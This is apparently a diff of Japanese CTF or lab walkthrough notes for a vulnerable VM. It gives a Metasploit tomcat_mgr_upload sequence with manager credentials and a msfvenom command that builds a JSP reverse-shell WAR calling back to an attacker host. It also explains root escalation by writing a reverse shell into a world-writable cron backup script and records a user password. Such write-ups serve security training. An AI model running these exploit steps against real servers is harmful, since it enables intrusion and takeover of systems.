@@ -29,17 +29,31 @@ exploit
   - `List Application`を選択する
   - 真ん中のところに`WAR file to deploy`ここから、reverse-shellをuploadする 
 
+- msfconsoleを使って、reverse-shellをする
+```
+msfconsole -q
+search exploit tomcat upload
+use exploit/multi/http/tomcat_mgr_upload
+set rhosts 192.168.56.113
+set rport 8080
+set httpusername tomcat
+set httppassword role1
+run
+```
 
-- リバースシェルをする
+- ブラウザからmsfvenomをuploadしてリバースシェルする 
   - msfvenomを作る
   - これはphp-reverse-shell.phpのJava言語に替えたもの
-  - `msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=9001 -f war > shell.war`
-  - ブラウザからshell.warを選択する
+  - `msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=9999 -f war > shell9999.war`
+  - ブラウザからshell.warを選択してdeployボタンを押して展開 
   - Parrotで待ち受ける
-  - 一覧のリストからshell.warを押すとプロンプトが返ってくる
+  - 一覧のリストからshell9999.warを押すとプロンプトが返ってくる。またはブラウザのリンクに`http://~:9999/shell9999/`にアクセスする
 - 対話型シェルにする
-- thalesのhomeにnotes.txtという気になるのがある
-- ユーザの切り替え
+- suidを見る
+  - findコマンドがない 
+- thalesのhomeにnotes.txtという気になるのがある。backupのスクリプトがあると書いてある。backup.shのpermissionを見ると誰でも書き込みできることがわかる。backupというのは、だいたい定期的にcronが動いているので、このファイルにリバースシェルを書き込んでrootを取得できる
+
+- (ここやらなくてもできる)ユーザの切り替え
   - `su thales` 
   - passwordは`vodka06`
 
